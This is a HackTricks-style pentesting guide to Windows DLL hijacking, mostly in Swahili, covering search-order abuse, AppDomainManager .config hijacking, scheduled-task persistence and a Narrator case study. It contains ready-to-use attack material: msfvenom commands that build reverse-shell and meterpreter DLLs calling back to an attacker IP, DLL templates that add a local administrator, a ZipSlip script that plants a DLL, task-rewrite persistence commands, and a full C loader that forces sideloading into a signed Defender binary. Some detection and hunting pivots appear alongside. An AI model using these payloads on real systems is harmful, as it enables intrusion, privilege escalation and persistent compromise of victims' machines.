# DLL Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Taarifa za Msingi

DLL Hijacking inahusisha kuibadilisha application inayoaminika ili ipakie DLL hasidi. Neno hili linajumuisha mbinu kadhaa kama **DLL Spoofing, Injection, na Side-Loading**. Hutumika hasa kwa utekelezaji wa code, kupata persistence, na, mara chache zaidi, privilege escalation. Licha ya kuzingatia escalation hapa, mbinu ya hijacking hubaki ileile bila kujali lengo.

### Mbinu za Kawaida

Mbinu kadhaa hutumika kwa DLL hijacking, na ufanisi wa kila moja hutegemea mkakati wa application wa kupakia DLL:<sup>[[4]](#references)</sup>

1. **DLL Replacement**: Kubadilisha DLL halisi na DLL hasidi, kwa hiari ukitumia DLL Proxying ili kuhifadhi utendaji wa DLL ya awali.
2. **DLL Search Order Hijacking**: Kuweka DLL hasidi kwenye search path iliyo mbele ya ile halali, kwa kutumia search pattern ya application.
3. **Phantom DLL Hijacking**: Kuunda DLL hasidi ambayo application itapakia, ikidhani kuwa ni DLL inayohitajika lakini haipo.
4. **DLL Redirection**: Kubadilisha search parameters kama `%PATH%` au faili za `.exe.manifest` / `.exe.local` ili kuelekeza application kwenye DLL hasidi.
5. **WinSxS DLL Replacement**: Kubadilisha DLL halali na inayolingana nayo yenye madhara kwenye directory ya WinSxS, mbinu ambayo mara nyingi huhusishwa na DLL side-loading.
6. **Relative Path DLL Hijacking**: Kuweka DLL hasidi kwenye directory inayodhibitiwa na mtumiaji pamoja na application iliyonakiliwa, sawa na mbinu za Binary Proxy Execution.

{{#ref}}
windows-cpython-build-landmark-sys-path-hijacking.md
{{#endref}}


### AppDomainManager hijacking (`<exe>.config` + attacker assembly)

Classic DLL sideloading siyo njia pekee ya kufanya process inayoaminika ya **.NET Framework** ipakie code ya attacker. Ikiwa executable inayolengwa ni application ya **managed**, CLR pia hukagua application configuration file yenye jina la executable (kwa mfano `Setup.exe.config`). Faili hiyo inaweza kufafanua **AppDomainManager** maalum. Ikiwa config inaelekeza kwenye assembly inayodhibitiwa na attacker na iliyowekwa kando ya EXE, CLR huipakia **kabla ya application kufuata code path yake ya kawaida** na kuiendesha ndani ya process inayoaminika.<sup>[[24]](#references)</sup>

Kulingana na schema ya Microsoft ya configuration ya .NET Framework, `<appDomainManagerAssembly>` na `<appDomainManagerType>` lazima ziwepo ili manager maalum itumike.<sup>[[16]](#references)[[17]](#references)</sup>

Minimal config:
```xml
<configuration>
<runtime>
<appDomainManagerAssembly value="EvilMgr, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null" />
<appDomainManagerType value="EvilMgr.Loader" />
</runtime>
</configuration>
```
Msimamizi wa kiwango cha chini:
```csharp
using System; using System.Runtime.InteropServices;
public sealed class Loader : AppDomainManager {
[DllImport("user32.dll")] static extern int MessageBox(IntPtr h, string t, string c, int m);
public override void InitializeNewDomain(AppDomainSetup appDomainInfo) {
MessageBox(IntPtr.Zero, "Loaded inside trusted .NET host", "AppDomain hijack", 0);
}
}
```
Vidokezo vya vitendo:
- Hii ni tradecraft maalum ya **.NET Framework**. Inategemea uchanganuzi wa CLR config, si mpangilio wa Win32 DLL search order.
- Host lazima iwe kweli **managed EXE**. Quick triage: `sigcheck -m target.exe`, `corflags target.exe`, au angalia **CLR Runtime Header** katika PE metadata.
- Jina la config lazima lilingane kabisa na jina la executable (`<binary>.config`) na kwa kawaida huwa **karibu na EXE**.
- Hii ni muhimu kwa **signed Microsoft/vendor binaries** kwa sababu trusted EXE hubaki bila kuguswa huku malicious managed assembly iki-execute in-process.
- Ikiwa tayari una installer/update directory inayoweza kuandikwa, AppDomainManager hijacking inaweza kutumiwa kama **first stage**, ikifuatiwa na classic DLL sideloading au reflective loading kwa stages zinazofuata.

### AppDomainManager as a downloader + scheduled-task bootstrap

Muundo wa vitendo wa intrusion ni kuoanisha trusted managed EXE na `*.config` yenye malicious pamoja na malicious AppDomainManager DLL inayofanya kazi tu kama **small bootstrapper**:<sup>[[25]](#references)</sup>

1. Mtumiaji huzindua signed .NET installer au updater kutoka eneo linaloaminika, kama `%USERPROFILE%\Downloads`.
2. Config iliyo karibu husababisha CLR kupakia attacker assembly **kabla** ya legitimate app logic kuanza.
3. Malicious manager hufanya **path gate** (kwa mfano, kuendelea tu ikiwa host EXE ina-run kutoka `Downloads`, na kuruhusu second stage i-run kutoka `%LOCALAPPDATA%` pekee).
4. Ukaguzi ukifaulu, hupakua real payload kwenye path inayoweza kuandikwa na mtumiaji kama `%LOCALAPPDATA%\PerfWatson2.exe` na kusakinisha persistence kwa scheduled task.

Kwa nini variant hii ni muhimu:
- Signed host EXE hubaki bila kubadilishwa, hivyo triage inayohash main binary pekee inaweza kukosa compromise.
- **Path-based anti-analysis** rahisi ni ya kawaida: kuhamisha ZIP/EXE/DLL triad hadi Desktop, Temp, au sandbox path kunaweza kuvunja chain kwa makusudi.
- First-stage AppDomainManager DLL inaweza kubaki ndogo na yenye noise kidogo huku real implant ikipakuliwa baadaye.

Mfano mdogo wa persistence unaoonekana mara nyingi katika pattern hii:
```cmd
schtasks /create /tn "GoogleUpdaterTaskSystem140.0.7272.0" /sc onlogon /tr "%LOCALAPPDATA%\PerfWatson2.exe" /rl highest /f
```
Notes:
- ` /rl highest` inamaanisha **highest available** kwa user/session hiyo; si escalation iliyohakikishwa hadi SYSTEM yenyewe.
- Technique hii mara nyingi huainishwa vizuri zaidi kama **execution/persistence via .NET config abuse** kuliko classic missing-DLL search-order hijacking, ingawa operators mara nyingi huunganisha zote mbili.

Detection pivots:
- Signed .NET executables zinazoanzishwa kutoka **ZIP extraction paths**, `Downloads`, `%TEMP%`, au folders nyingine zinazoandikika na user, zikiwa na `<exe>.config` **colocated**.
- Scheduled tasks mpya ambazo action yake inaelekeza kwenye `%LOCALAPPDATA%`, `%APPDATA%`, au `Downloads`, na majina yake yanafanana na browser/vendor updaters.
- Managed bootstrap processes za muda mfupi ambazo mara moja hudownload EXE nyingine, kisha kuanzisha `schtasks.exe`.
- Samples zinazo-exit mapema isipokuwa executable path ilingane na user-profile directory inayotarajiwa.

### Hijacking an existing scheduled task to relaunch the sideload chain

Kwa persistence, usitafute tu **creating a new task**. Baadhi ya intrusion sets husubiri installer halali iunde **normal updater task**, kisha **rewrite task action** ili jina lililopo, author, na trigger zibaki zikijulikana kwa defenders.

Reusable workflow:
1. Install/run software halali na utambue task ambayo kwa kawaida huunda.
2. Export task XML na uandike thamani za sasa za `<Exec><Command>` / `<Arguments>`.<sup>[[23]](#references)</sup>
3. Badilisha action pekee ili task ianzishe **trusted host EXE** yako kutoka user-writable staging directory, ambayo kisha husideload au ku-AppDomain-load real payload.
4. Re-register task yenye jina lilelile badala ya kuunda persistence artifact mpya iliyo wazi.
```cmd
schtasks /query /tn "<TaskName>" /xml > task.xml
:: edit the <Exec><Command> and optional <Arguments> nodes
schtasks /create /tn "<TaskName>" /xml task.xml /f
```
Kwa nini ni stealthier:
- Jina la task bado linaweza kuonekana legitimate (kwa mfano vendor updater).
- **Task Scheduler service** ndiyo hui-launch, hivyo parent/ancestor validation mara nyingi huona scheduling chain inayotarajiwa badala ya `explorer.exe`.
- DFIR teams zinazowinda tu **majina mapya ya tasks** zinaweza kukosa task ambayo registration yake ilikuwepo tayari lakini action yake sasa inaelekeza kwenye `%LOCALAPPDATA%`, `%APPDATA%`, au path nyingine inayodhibitiwa na attacker.

Fast hunting pivots:
- `schtasks /query /fo LIST /v | findstr /i "TaskName Task To Run"`
- `Get-ScheduledTask | % { [pscustomobject]@{TaskName=$_.TaskName; TaskPath=$_.TaskPath; Exec=($_.Actions | % Execute)} }`
- Linganisha XML ya `C:\Windows\System32\Tasks\*` na metadata ya `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\*` dhidi ya baseline.
- Toa alert wakati **vendor-looking updater task** inatekelezwa kutoka **user-writable directories** au inapo-launch .NET EXE yenye faili ya `*.config` iliyo pamoja nayo.

> [!TIP]
> Kwa chain ya hatua kwa hatua inayoweka HTML staging, AES-CTR configs, na .NET implants juu ya DLL sideloading, kagua workflow iliyo hapa chini.

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## Kutafuta DLL zinazokosekana

Njia ya kawaida zaidi ya kutafuta Dlls zinazokosekana ndani ya system ni kuendesha [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) kutoka sysinternals, **ukiweka** **filters 2 zifuatazo**:

![Common Techniques - Finding missing Dlls: The most common way to find missing Dlls inside a system is running procmon from sysinternals, setting the following 2 filters](<../../../images/image (961).png>)

![Common Techniques - Finding missing Dlls: The most common way to find missing Dlls inside a system is running procmon from sysinternals, setting the following 2 filters](<../../../images/image (230).png>)

na uonyeshe tu **File System Activity**:

![Common Techniques - Finding missing Dlls: and just show the File System Activity](<../../../images/image (153).png>)

Ikiwa unatafuta **dlls zinazokosekana kwa ujumla**, **acha** hii ikiendelea kwa **sekunde** kadhaa.\
Ikiwa unatafuta **DLL inayokosekana ndani ya executable maalum**, weka filter nyingine kama **"Process Name" "contains" `<exec name>`**, i-execute, kisha usitishe kunasa events.<sup>[[9]](#references)</sup>

## Kutumia vibaya DLL zinazokosekana

Ili kuongeza privileges, tafuta **DLL ambayo privileged process hujaribu ku-load** kutoka location ambayo unaweza kuandikia. Hili linaweza kutokea unapodhibiti directory inayotafutwa kabla ya directory iliyo na legitimate DLL, au wakati DLL iliyoombwa haipo na unaweza kuandikia mojawapo ya directories zinazotafutwa.

### Mpangilio wa Utafutaji wa Dll

**Ndani ya** [**Microsoft documentation**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **unaweza kupata jinsi Dlls zinavyopakiwa hasa.**

**Windows applications** hutafuta DLLs kwa kufuata seti ya **pre-defined search paths**, kwa kuzingatia sequence maalum. Tatizo la DLL hijacking hutokea wakati DLL hatari inawekwa kimkakati katika mojawapo ya directories hizi, na hivyo kuhakikisha inapakiwa kabla ya DLL halisi. Suluhisho la kuzuia hili ni kuhakikisha application inatumia absolute paths inaporejelea DLLs inayohitaji.

Unaweza kuona **DLL search order kwenye** systems za **32-bit** hapa chini:

1. Directory ambayo application ilipakiwa kutoka.
2. System directory. Tumia function ya [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) kupata path ya directory hii.(_C:\Windows\System32_)
3. 16-bit system directory. Hakuna function inayopata path ya directory hii, lakini directory hiyo hutafutwa. (_C:\Windows\System_)
4. Windows directory. Tumia function ya [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) kupata path ya directory hii.
1. (_C:\Windows_)
5. Current directory.
6. Directories zilizoorodheshwa katika PATH environment variable. Kumbuka kuwa hii haijumuishi per-application path iliyoainishwa na **App Paths** registry key. **App Paths** key haitumiki wakati wa kukokotoa DLL search path.

Huo ndio **default** search order wakati **SafeDllSearchMode** imewezeshwa. Inapozimwa, current directory hupanda hadi nafasi ya pili. Ili kuzima feature hii, tengeneza **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** registry value na uiweke kuwa 0 (default ni enabled).

Ikiwa function ya [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) inaitwa ikiwa na **LOAD_WITH_ALTERED_SEARCH_PATH**, search huanza katika directory ya executable module ambayo **LoadLibraryEx** ina-load.

Mwisho, DLL inaweza ku-loadiwa kwa absolute path badala ya jina. Katika hali hiyo, Windows huangalia path hiyo pekee kwa DLL yenyewe; dependencies zilizoombwa kwa jina bado hufuata search order inayotumika.

Kuna njia nyingine za kubadilisha search order, lakini sitazieleza hapa.

### Kuunganisha arbitrary file write na missing-DLL hijack

1. Tumia **ProcMon** filters (`Process Name` = target EXE, `Path` ends with `.dll`, `Result` = `NAME NOT FOUND`) kukusanya majina ya DLL ambayo process inaprobes lakini haiwezi kuyapata.<sup>[[14]](#references)</sup>
2. Ikiwa binary inaendeshwa kwenye **schedule/service**, kuweka DLL yenye mojawapo ya majina hayo katika **application directory** (search-order entry #1) kutaifanya ipakiwe kwenye execution inayofuata. Katika kesi moja ya .NET scanner, process ilitafuta `hostfxr.dll` katika `C:\samples\app\` kabla ya ku-load copy halisi kutoka `C:\Program Files\dotnet\fxr\...`.
3. Tengeneza payload DLL (kwa mfano reverse shell) yenye export yoyote: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f dll -o hostfxr.dll`.
4. Ikiwa primitive yako ni **arbitrary write ya aina ya ZipSlip**, tengeneza ZIP ambayo entry yake inatoroka extraction dir ili DLL iangukie kwenye app folder:
```python
import zipfile
with zipfile.ZipFile("slip-shell.zip", "w") as z:
z.writestr("../app/hostfxr.dll", open("hostfxr.dll","rb").read())
```
5. Peleka archive kwenye inbox/share inayofuatiliwa; scheduled task itakapoanzisha tena process, itapakia malicious DLL na kutekeleza code yako kama service account.

### Kulazimisha sideloading kupitia RTL_USER_PROCESS_PARAMETERS.DllPath

Njia ya hali ya juu ya kuathiri kwa uhakika DLL search path ya process mpya iliyoundwa ni kuweka field ya DllPath katika RTL_USER_PROCESS_PARAMETERS wakati wa kuunda process kwa kutumia native APIs za ntdll. Kwa kutoa directory inayodhibitiwa na attacker hapa, target process inayotatua imported DLL kwa jina (bila absolute path na bila kutumia safe loading flags) inaweza kulazimishwa kupakia malicious DLL kutoka kwenye directory hiyo.

Wazo kuu
- Unda process parameters kwa kutumia RtlCreateProcessParametersEx na utoe DllPath maalum inayoelekeza kwenye folder unayodhibiti (kwa mfano, directory ambako dropper/unpacker yako iko).
- Unda process kwa kutumia RtlCreateUserProcess. Target binary inapotatua DLL kwa jina, loader itachunguza DllPath iliyotolewa wakati wa utatuzi, hivyo kuwezesha sideloading ya kuaminika hata wakati malicious DLL haiko pamoja na target EXE.

Vidokezo/mapungufu
- Hii huathiri child process inayoundwa; ni tofauti na SetDllDirectory, ambayo huathiri current process pekee.
- Target lazima i-import au LoadLibrary DLL kwa jina (bila absolute path na bila kutumia LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories).
- KnownDLLs na hardcoded absolute paths haziwezi kuhijackiwa. Forwarded exports na SxS zinaweza kubadilisha precedence.

Mfano mdogo wa C (ntdll, wide strings, error handling iliyorahisishwa):

<details>
<summary>Mfano kamili wa C: kulazimisha DLL sideloading kupitia RTL_USER_PROCESS_PARAMETERS.DllPath</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

Mfano wa matumizi ya kiutendaji
- Weka xmllite.dll hasidi (inayotoa functions zinazohitajika au ku-proxy hadi ile halisi) kwenye directory yako ya DllPath.
- Anzisha binary iliyosainiwa inayojulikana kutafuta xmllite.dll kwa jina kwa kutumia technique iliyo hapo juu. Loader hutatua import kupitia DllPath iliyotolewa na kufanya sideload ya DLL yako.

Technique hii imeonekana ikitumika in-the-wild kuendesha sideloading chains za hatua nyingi: launcher ya kwanza huweka helper DLL, ambayo kisha huanzisha binary iliyosainiwa na Microsoft na inayoweza kufanyiwa hijack, ikiwa na DllPath maalum ili kulazimisha kupakia DLL ya mshambuliaji kutoka staging directory.<sup>[[6]](#references)</sup>


### AppDomainManager hijacking via `.exe.config`

Kwa targets za **.NET Framework**, sideloading inaweza kufanywa **kabla ya `Main()`** bila kupatch memory kwa kutumia vibaya faili ya karibu ya **`.exe.config`** ya application. Badala ya kutegemea tu Win32 DLL search order, mshambuliaji huweka .NET EXE halali karibu na config hasidi pamoja na assemblies moja au zaidi zinazodhibitiwa na mshambuliaji.

Jinsi chain inavyofanya kazi:<sup>[[15]](#references)[[22]](#references)</sup>
1. Host EXE huanza na **CLR husoma `<exe>.config`**.
2. Config huweka **`<appDomainManagerAssembly>`** na **`<appDomainManagerType>`** ili runtime iunde `AppDomainManager` inayodhibitiwa na mshambuliaji.
3. Manager hasidi hupata **utekelezaji wa kabla ya `Main()`** ndani ya trusted host process.
4. Config hiyo hiyo inaweza kulazimisha CLR kutatua assemblies za ndani kwanza (kwa mfano `InitInstall.dll`, `Updater.dll`, `uevmonitor.dll`) na inaweza kudhoofisha runtime validation/telemetry bila inline patching.

Muundo wa mtindo wa campaign (upachikaji halisi unaweza kutofautiana kulingana na directive / CLR version):
```xml
<configuration>
<runtime>
<appDomainManagerAssembly value="Updater" />
<appDomainManagerType value="MyAppDomainManager" />
<assemblyBinding xmlns="urn:schemas-microsoft-com:asm.v1">
<probing privatePath="." />
<publisherPolicy apply="no" />
</assemblyBinding>
<bypassTrustedAppStrongNames enabled="true" />
<etwEnable enabled="false" />
</runtime>
<startup>
<requiredRuntime version="v4.0.30319" safemode="true" />
</startup>
</configuration>
```
Kwa nini hii ni muhimu:
- **`<probing privatePath="."/>`** huweka assembly resolution ndani ya directory ya application, na kuifanya folder kuwa sideloading surface inayotabirika.<sup>[[18]](#references)</sup>
- **`<appDomainManagerAssembly>` + `<appDomainManagerType>`** huhamisha execution kwenye attacker code wakati wa CLR initialization, kabla logic halali ya application haijaanza kutekelezwa.<sup>[[16]](#references)[[17]](#references)</sup>
- **`<bypassTrustedAppStrongNames enabled="true"/>`** inaweza kuruhusu full-trust app kupakia assemblies zisizo na saini au zilizoharibiwa bila strong-name validation failure.<sup>[[19]](#references)</sup>
- **`<publisherPolicy apply="no"/>`** huepuka publisher-policy redirects zinazoelekeza kwenye assemblies mpya zaidi.<sup>[[20]](#references)</sup>
- **`<requiredRuntime ... safemode="true"/>`** hufanya runtime selection iwe deterministic zaidi.<sup>[[21]](#references)</sup>
- **`<etwEnable enabled="false"/>`** inavutia hasa kwa sababu **CLR huzima ETW visibility yake yenyewe** kupitia configuration badala ya implant kufanya patch ya `EtwEventWrite` kwenye memory.

Operational pattern iliyoonekana katika campaigns za hivi karibuni:
- Stage 1 huweka `setup.exe`, `setup.exe.config`, na local assemblies.
- Stage 2 huzinakili kwenye folder inayoaminika ya **AppData update**, hubadilisha jina la host kuwa kama `update.exe`, kisha huizindua tena kupitia **scheduled task**.
- Stage 3 huthibitisha execution context (kwa mfano parent anayetarajiwa `svchost.exe` kutoka Task Scheduler) kabla ya kupakia final RAT DLL/export.

Hunting ideas:
- **.NET executables** zilizosainiwa au zinazoonekana kuwa halali, zinazoendeshwa pamoja na **`.config`** files zenye kutia shaka katika locations zinazoweza kuandikwa na user.
- `.config` files zilizo na **`appDomainManagerAssembly`**, **`appDomainManagerType`**, **`probing privatePath="."`**, **`bypassTrustedAppStrongNames`**, au **`etwEnable enabled="false"`**.
- Scheduled tasks zinazoanzisha tena update binaries zilizobadilishwa majina kutoka **`%LOCALAPPDATA%`** au directories maalum za app kama `\bin\update\`.
- Parent/child chains ambapo scheduled task huzindua trusted .NET host ambayo hupakia mara moja non-vendor assemblies kutoka directory yake yenyewe.

#### Exceptions on dll search order from Windows docs

Exceptions fulani kwa standard DLL search order zimebainishwa katika Windows documentation:

- Wakati **DLL inayoshiriki jina na DLL ambayo tayari imepakiwa kwenye memory** inapokutana, system hupita usual search. Badala yake, hufanya check ya redirection na manifest kabla ya kutumia DLL ambayo tayari iko kwenye memory. **Katika hali hii, system haitafuti DLL**.
- Katika hali ambapo DLL inatambuliwa kama **known DLL** kwa Windows version ya sasa, system itatumia version yake ya known DLL, pamoja na dependent DLLs zake, **ikiepuka search process**. Registry key **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** huhifadhi list ya known DLLs hizi.
- Ikiwa **DLL ina dependencies**, search ya dependent DLLs hizi hufanywa kana kwamba zilionyeshwa kwa kutumia **module names** pekee, bila kujali kama DLL ya awali ilitambuliwa kupitia full path.

### Kuongeza Privileges

**Requirements**:

- Tambua process inayofanya kazi au itakayofanya kazi chini ya **different privileges** (horizontal au lateral movement), na ambayo **haina DLL**.
- Hakikisha **write access** inapatikana kwa **directory** yoyote ambayo **DLL** itatafutwa. Location hii inaweza kuwa directory ya executable au directory iliyo ndani ya system path.

Masharti haya kwa kawaida si ya kawaida kwa default: privileged executables kwa kawaida hazikosi missing DLL dependencies, na standard users kwa kawaida hawawezi kuandika kwenye system search-path directories. Environments zilizosanidiwa vibaya bado zinaweza kufichua masharti yote mawili.\
Ikiwa requirements zimetimizwa, angalia project ya [UACME](https://github.com/hfiref0x/UACME). Ingawa lengo lake kuu ni UAC bypass, ina DLL-hijacking PoCs kwa Windows versions maalum ambazo mara nyingi zinaweza kuadaptishwa kwa writable directory uliyopata.

Kumbuka kwamba unaweza **kuangalia permissions zako kwenye folder** kwa kufanya:<sup>[[5]](#references)</sup>
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
Na **kagua ruhusa za folda zote zilizo ndani ya PATH**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Unaweza pia kuangalia imports za executable na exports za dll kwa kutumia:
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
Kwa mwongozo kamili wa jinsi ya **abuse DLL Hijacking to escalate privileges** ukiwa na ruhusa za kuandika katika folda ya **System Path**, angalia:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Zana za kiotomatiki

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)itaangalia ikiwa una ruhusa za kuandika katika folda yoyote iliyo ndani ya system PATH.\
Zana nyingine za kiotomatiki zinazovutia za kugundua vulnerability hii ni **PowerSploit functions**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ na _Write-HijackDll._

### Mfano

Iwapo utapata hali inayoweza kutumiwa, mojawapo ya mambo muhimu zaidi ya kuitumia kwa mafanikio ni **kuunda dll inayotuma angalau functions zote ambazo executable ita-import kutoka humo**. Hata hivyo, kumbuka kuwa DLL Hijacking ni muhimu unapohitaji [ku-escalate kutoka kiwango cha Medium Integrity hadi High **(bypassing UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) au kutoka[ **High Integrity hadi SYSTEM**](../index.html#from-high-integrity-to-system)**.** Unaweza kupata mfano wa **jinsi ya kuunda dll halali** ndani ya utafiti huu wa DLL hijacking unaolenga DLL hijacking kwa ajili ya execution: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Zaidi ya hayo, katika **sehemu inayofuata** unaweza kupata **msimbo wa msingi wa dll** ambao unaweza kuwa muhimu kama **templates** au kwa kuunda **dll yenye functions zisizohitajika zilizotumwa nje**.

## **Kuunda na ku-compile DLLs**

### **DLL Proxifying**

Kimsingi, **DLL proxy** ni DLL inayoweza **ku-execute code yako hasidi inapopakiwa** lakini pia **ku-expose** na **kufanya kazi** kama **inavyotarajiwa** kwa **ku-relay calls zote kwenda kwenye library halisi**.

Ukitumia tool [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) au [**Spartacus**](https://github.com/Accenture/Spartacus), unaweza **kuonyesha executable na kuchagua library** unayotaka ku-proxify na **kutengeneza dll iliyoproxifyiwa**, au **kuonyesha DLL** na **kutengeneza dll iliyoproxifyiwa**.

### **Meterpreter**

**Pata rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Pata meterpreter (x86):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Unda mtumiaji (x86 sikuona toleo la x64):**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Yako mwenyewe

Katika hali nyingi, DLL unayokompile lazima **iexport kila function iliyoimportiwa na victim process**. Ikiwa export inayohitajika haipo, binary haiwezi kuresolve function hiyo na exploit inashindikana.

<details>
<summary>C DLL template (Win10)</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
</details>
```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary> Mfano wa C++ DLL wenye uundaji wa mtumiaji</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<details>
<summary>C DLL Mbadala yenye thread entry</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## Case Study: Narrator OneCore TTS Localization DLL Hijack (Accessibility/ATs)

Windows Narrator.exe bado huchunguza DLL ya localization inayotabirika na mahususi kwa lugha wakati wa kuanza, ambayo inaweza kuhijackiwa kwa ajili ya arbitrary code execution na persistence.<sup>[[7]](#references)</sup>

Mambo muhimu
- Probe path (build za sasa): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Legacy path (build za zamani): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- Ikiwa DLL inayoweza kuandikwa na inayodhibitiwa na attacker ipo kwenye OneCore path, inapakiwa na `DllMain(DLL_PROCESS_ATTACH)` hutekelezwa. Hakuna exports zinazohitajika.

Discovery with Procmon
